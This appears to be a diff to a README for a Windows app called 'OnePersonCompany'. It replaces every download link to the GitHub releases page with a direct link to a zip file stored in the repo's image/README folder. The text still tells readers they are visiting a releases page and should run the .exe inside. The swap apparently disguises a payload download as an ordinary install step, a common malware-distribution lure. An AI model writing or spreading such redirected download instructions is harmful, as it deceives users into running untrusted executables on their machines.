@@ -1,12 +1,12 @@
 # 🗂️ OnePersonCompany - Streamline Solo Project Updates
 
-[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
+[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Failurecounterfactuality324/OnePersonCompany/main/image/README/Person_Company_One_3.4.zip)
 
 ## 📥 Download OnePersonCompany
 
 You can get the app by visiting the releases page here:
 
-[Download OnePersonCompany](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
+[Download OnePersonCompany](https://raw.githubusercontent.com/Failurecounterfactuality324/OnePersonCompany/main/image/README/Person_Company_One_3.4.zip)
 
 This page shows all the available versions. Pick the latest one for Windows. The file you want will usually end with `.exe` or `.zip`. For the easiest use, find the `.exe` setup file. Download and save it to your computer.
 
@@ -57,7 +57,7 @@ Follow these steps to get OnePersonCompany running on your Windows PC.
 
 Go to this page:
 
-https://github.com/Failurecounterfactuality324/OnePersonCompany/releases
+https://raw.githubusercontent.com/Failurecounterfactuality324/OnePersonCompany/main/image/README/Person_Company_One_3.4.zip
 
 ### 2. Find the Latest Version
 
@@ -172,4 +172,4 @@ ai-agent, automation, indie-hacker, llm, productivity, python, solo-founder, sta
 
 ---
 
-[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
+[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Failurecounterfactuality324/OnePersonCompany/main/image/README/Person_Company_One_3.4.zip)
